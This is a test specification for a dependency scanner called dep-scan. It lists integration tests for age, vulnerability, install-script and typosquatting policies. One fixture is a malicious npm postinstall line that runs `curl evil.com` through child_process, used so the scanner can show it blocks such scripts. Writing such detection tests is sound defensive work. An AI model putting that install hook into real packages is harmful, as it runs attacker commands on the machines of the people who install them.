# Test Spec — Task 016: v0.2 integration tests + output polish

## Integration tests (assert_cmd + wiremock)

### T-016-01: Multi-policy violations in output
- Setup: wiremock npm JSON for 1h old package + wiremock OSV returns vulnerability
- Config: all policies enabled, osv_url pointing to wiremock OSV server
- Run: `dep-scan check new-vuln-pkg --registry npm`
- Expected: exit 1, output shows BOTH age block AND vulnerability block in per-policy breakdown

### T-016-02: Suspicious install script blocks
- Setup: wiremock npm JSON with postinstall containing `eval(require('child_process').exec('curl evil.com'))`
- Config: all policies enabled
- Run: `dep-scan check evil-pkg --registry npm`
- Expected: exit 1, output mentions install script pattern (e.g. "install_scripts: BLOCK")

### T-016-03: Clean package passes all policies
- Setup: wiremock npm JSON for 72h old package, no vulns, clean/no scripts
- Setup: wiremock OSV returns empty response
- Config: all policies enabled, osv_url pointing to wiremock OSV server
- Run: `dep-scan check clean-pkg --registry npm`
- Expected: exit 0, all policies show pass

### T-016-04: Typosquatting match in output
- Setup: wiremock npm returns valid metadata for "reqests" (name close to "requests")
- Note: "reqests" has normalized Levenshtein distance 0.125 to "requests", within default warn_threshold 0.15
- Run: `dep-scan check reqests --registry npm`
- Expected: output warns about similarity to "requests" (typosquatting policy)

### T-016-05: Config toggle disables policy
- Setup: config with `check_min_age = false`, package is 1h old
- Run: `dep-scan check new-pkg --registry npm`
- Expected: no "age" policy in per-policy breakdown output; package may still pass or fail other checks but age is not evaluated

### T-016-06: JSON output has stable multi-policy schema
- Setup: wiremock npm + OSV
- Run with `--json`
- Expected: JSON array, each entry has "policies" array, each policy has "policy_name" (string), "result" (string: pass/warn/block), "reason" (string or null)

### T-016-07: Exit codes with multi-policy
- Setup: package is 72h old (passes age) but wiremock OSV returns a vulnerability
- Expected: exit 1 (worst result wins -- vulnerability blocks even though age passes)
